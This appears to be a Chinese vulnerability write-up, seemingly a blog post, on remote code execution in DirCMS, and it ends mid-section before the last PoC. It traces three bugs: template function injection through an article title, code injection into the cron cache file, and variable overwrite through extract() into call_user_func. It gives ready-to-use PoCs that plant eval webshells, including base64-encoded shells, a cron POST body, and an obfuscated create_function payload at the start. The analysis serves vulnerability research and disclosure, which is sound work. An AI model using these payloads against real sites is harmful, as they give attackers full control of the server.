class="nc">PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs</span><span class="o">/</span><span class="nc">Pg</span><span class="o">==</span><span class="p">)}</span>
</code></pre></div></div>

<h3 id="前台代码执行模板解析导致-rce">前台代码执行（模板解析导致 RCE）</h3>
<p>这个前台的 RCE 与上面的后台 RCE sink 点一致，都是利用 php55_replace_function 函数。</p>

<p>搜索 php55_replace_function 的调用点，主要出现在 dircms/Fcms/Library/Seo.php 和 dircms/Fcms/Library/Router.php 两个文件中。</p>

<p>Seo 类中的三个函数都有调用：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dircms/Fcms/Library/Seo.php
    - Seo 类
        - category 函数
        - search 函数
        - show 函数
</code></pre></div></div>
<p>其中，search 函数用于前端查询窗口，上面的后台 RCE 就是需要通过这个函数来触发，但此处的 payload 需要依赖后台数据修改。</p>

<p>show 函数用于文章的展示，查看某一篇文章时就会调用，部分代码如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">show</span><span class="p">(</span><span class="nv">$mod</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'['</span><span class="mf">.</span><span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'第%s页'</span><span class="p">,</span> <span class="s1">'{page}'</span><span class="p">)</span><span class="mf">.</span><span class="s1">'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'</span><span class="p">;</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">?</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'['</span><span class="p">,</span> <span class="s1">']'</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">)</span> <span class="o">:</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\[.+\]/U'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">);</span>

    <span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([A-Z_]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_var'</span><span class="p">),</span> <span class="nv">$meta_title</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_data'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nf">dr_clearhtml</span><span class="p">(</span><span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>可以看到其中用到了 <code class="language-plaintext highlighter-rouge">{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}</code> 这个模板，也就是说，在经过 php55_replace_data 函数时，就会使用文章实际的标题来替换 <code class="language-plaintext highlighter-rouge">{title}</code>。</p>

<p>但需要注意的是，这段代码调用完 php55_replace_data 之后，继续调用 php55_replace_function，如果我们将 title 填充为 <code class="language-plaintext highlighter-rouge">{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}</code>，就可以进入 php55_replace_function 的调用。</p>

<p>因此，只需要创建一篇文章，将标题填充为上述的 payload 即可，如果站点开启了注册，我们就可以直接创建一个普通用户，然后创建一篇文章就可以 RCE。</p>

<p>poc:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)}
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808041749.png" alt="20230808041749" /></p>

<p>创建完之后在前台查看该文章就可以触发。</p>

<h3 id="后台代码注入缓存文件利用">后台代码注入（缓存文件利用）</h3>
<p>参考这篇文章 <a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a>，该漏洞出现在迅睿 CMS 框架版本 v4.3.3～v4.5.0，DirCMS 中没有明确标识版本，但根据代码逻辑判断属于该版本区间。</p>

<p>dircms/Core/Controllers/Admin/Cron.php 中的 add 函数会将用户输入写入缓存文件，并且每次访问时对缓存文件进行包含，由此造成代码注入，add 函数的代码如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">add</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$json</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">require</span> <span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="no">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>

            <span class="nv">$post</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

            <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">,</span>
                <span class="s1">'&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="mf">.</span><span class="s1">' $json=\''</span><span class="mf">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="mf">.</span><span class="s1">'\';'</span><span class="p">);</span>

            <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">system_log</span><span class="p">(</span><span class="s1">'设置自定义任务类型'</span><span class="p">);</span>

            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'操作成功'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">([</span>
            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
        <span class="p">]);</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="s1">'cron_add.html'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>触发 add 函数的调用需要进入管理员后台 -&gt; 应用 -&gt; 应用插件 -&gt; 任务队列。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808225520.png" alt="20230808225520" /></p>

<p>点击保存可以提交 post 报文，data 参数经过 json_encode 最终会写入 cache/config/cron.php</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">';file_put_contents(implode(base64_decode('</span><span class="nc">Lw</span><span class="o">==</span><span class="s1">'),['</span><span class="n">php</span><span class="o">:</span><span class="s1">','','</span><span class="n">filter</span><span class="s1">','</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="s1">','</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="s1">']),'</span><span class="nc">PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg</span><span class="o">==</span><span class="s1">');return;$a='</span>
</code></pre></div></div>

<p>最终写入 cache/config/cron.php 文件内容如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'FCPATH'</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>
 <span class="nv">$json</span><span class="o">=</span><span class="s1">'{"1":{"name":"'</span><span class="p">;</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'Lw=='</span><span class="p">),[</span><span class="s1">'php:'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'filter'</span><span class="p">,</span><span class="s1">'write=convert.base64-decode'</span><span class="p">,</span><span class="s1">'resource=evil.php'</span><span class="p">]),</span><span class="s1">'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg=='</span><span class="p">);</span><span class="k">return</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="s1">'"}}'</span><span class="p">;</span>
</code></pre></div></div>

<p>也参考这篇文章 <a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a> 中的 poc:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">isform</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">csrf_test_name</span><span class="o">=</span><span class="mi">3318</span><span class="n">a4fabdf4ea654734315a4d508a5f</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">name</span><span class="p">]</span><span class="o">=&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="s1">';file_put_contents('</span><span class="n">webshell</span><span class="mf">.</span><span class="n">php</span><span class="s1">',htmlspecialchars_decode('</span><span class="o">&lt;</span><span class="s1">').'</span><span class="o">?</span><span class="n">php</span> <span class="k">eval</span><span class="s1">'.base64_decode('</span><span class="no">KA</span><span class="o">==</span><span class="s1">').'</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="n">password</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="p">]</span><span class="s1">'.base64_decode('</span><span class="no">KQ</span><span class="o">==</span><span class="s1">').'</span><span class="p">;</span><span class="o">?</span><span class="s1">'.htmlspecialchars_decode('</span><span class="o">&gt;</span><span class="s1">'));return;'</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="前台代码执行变量覆盖导致模板变量可控">前台代码执行（变量覆盖导致模板变量可控）</h3>

<p>dircms/Fcms/Core/View.php 中的 list_tag 函数中存在这样的代码：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// list 标签解析</span>
<span class="k">public</span> <span class="k">function</span> <span class="n">list_tag</span><span class="p">(</span><span class="nv">$_params</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'action'</span><span class="p">])</span> <span class="p">{</span>

        <span class="k">case</span> <span class="s1">'function'</span><span class="o">:</span> <span class="c1">//执行函数</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'name参数不存在'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'函数['</span><span class="mf">.</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="mf">.</span><span class="s1">']未定义'</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'function-'</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nf">dr_array2string</span><span class="p">(</span><span class="nv">$param</span><span class="p">));</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cache</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$rt</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'param'</span><span class="p">]);</span>
                <span class="nv">$cache</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="nv">$rt</span>
                <span class="p">];</span>
                <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="nv">$cache</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
</code></pre></div></div>
<p>当 action 为字符串 function 时，会调用 <code class="language-plaintext highlighter-rouge">call_user_func($param['name'], $param['param'])</code> 执行函数。如果函数名与函数参数可控，则可以造成任意代码执行。</p>

<p>list_tag 函数在大量的模板文件中被调用，例如：cache/template/template_pc_default_home_api_list_data.html.cache.php。该文件是 template/pc/default/home/api/list_data.html 经过解析之后生成的 php 缓存文件。</p>

<p>当需要使用 list_data.html 这个前端文件时，就会将 cache/template/template_pc_default_home_api_list_data.html.cache.php 这个缓存文件包含进来。</p>

<p>该缓存文件的部分内容如下所示：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nv">$list_return</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid=</span><span class="nv">$catid</span><span class="s2"> page=1 cache=300"</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$list_return</span><span class="p">)</span> <span class="nb">extract</span><span class="p">(</span><span class="nv">$list_return</span><span class="p">,</span> <span class="no">EXTR_OVERWRITE</span><span class="p">);</span> <span class="nv">$count</span><span class="o">=</span><span class="nf">dr_count</span><span class="p">(</span><span class="nv">$return</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$return</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$return</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$is_first</span><span class="o">=</span><span class="nv">$key</span><span class="o">==</span><span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$is_last</span><span class="o">=</span><span class="nv">$count</span><span class="o">==</span><span class="nv">$key</span><span class="o">+</span><span class="mi">1</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ajax-load-con content excerpt-one"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-box posts-image-box"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"posts-default-title"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-entry-categories"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>其中会调用 list_tag 函数，且传入参数 <code class="language-plaintext highlighter-rouge">action=module module=news catid=$catid page=1 cache=300</code>。可以看到参数是通过空格进行分割的键值对，list_tag 函数在进行处理时，会将键值对保存在 <code class="language-plaintext highlighter-rouge">$system</code> 这个变量中：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
        <span class="mf">...</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// 系统参数，只能出现一次，不能添加修饰符</span>
            <span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]</span> <span class="o">=</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>例如第一个参数 action： <code class="language-plaintext highlighter-rouge">$system['action'] = dr_safe_replace('module')</code></p>

<p>想要进入 call_user_func，就需要 action 的值为 function。但在内置的所有模板中，没有模板使用到了 <code class="language-plaintext highlighter-rouge">action=function</code>。</p>

<p><strong>但需要注意的是</strong>，list_tag 在调用时 <code class="language-plaintext highlighter-rouge">$this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");</code>，使用到了一个 <code class="language-plaintext highlighter-rouge">$catid</code> 变量。由于这个变量被直接拼接进来，假如构造</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$catid</span> <span class="o">=</span> <span class="s2">" action=function name=phpinfo param0=-1"</span>
</code></pre></div></div>
<p>最终传入 list_tag 的参数就会变成：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"</span><span class="p">);</span>
</code></pre></div></div>
<p>action 参数被设置了两次，但最终会都被设置为后者的值，这样也就达到了目的。</p>

<p><code class="language-plaintext highlighter-rouge">$catid</code> 在哪被赋值呢？模板文件实际上是在 dircms/Fcms/Core/View.php 中的 display 函数中使用 include 包含进来的，<strong>在这个 include 的前方，正好调用了一次 extract 函数。</strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">display</span><span class="p">(</span><span class="nv">$_name</span><span class="p">,</span> <span class="nv">$_dir</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]))</span> <span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
		<span class="p">}</span>
        <span class="mf">...</span>

        <span class="nb">extract</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">,</span> <span class="no">EXTR_PREFIX_SAME</span><span class="p">,</span> <span class="s1">'data'</span><span class="p">);</span>

        <span class="mf">...</span>
        <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">load_view_file</span><span class="p">(</span><span class="nv">$_view_file</span><span class="p">);</span>
        <span class="mf">...</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>extract 函数可以造成变量覆盖，如果 <code class="language-plaintext highlighter-rouge">$this-&gt;_options</code>可控的话，就可以对 <code class="language-plaintext highlighter-rouge">$catid</code> 赋值。向上溯源可以发现根多地方都有调用 display 函数，但只有 dircms/Core/Controllers/Api/Api.php 中的 template 函数最方便利用：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">template</span><span class="p">()</span> <span class="p">{</span>

    <span class="nv">$file</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">));</span>
    <span class="nv">$module</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'module'</span><span class="p">));</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">'file'</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">,</span>
        <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$module</span><span class="p">,</span>
    <span class="p">];</span>

    <span class="mf">...</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$html</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nb">ob_clean</span><span class="p">();</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>直接调用 <code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> 函数并传入所有 GET 请求参数。<code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> 函数就是用于给 option 成员变量赋值的，如下所示：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">assign</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$key</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>由此一来从 GET 请求参数中传入即可。poc 如下：</p>
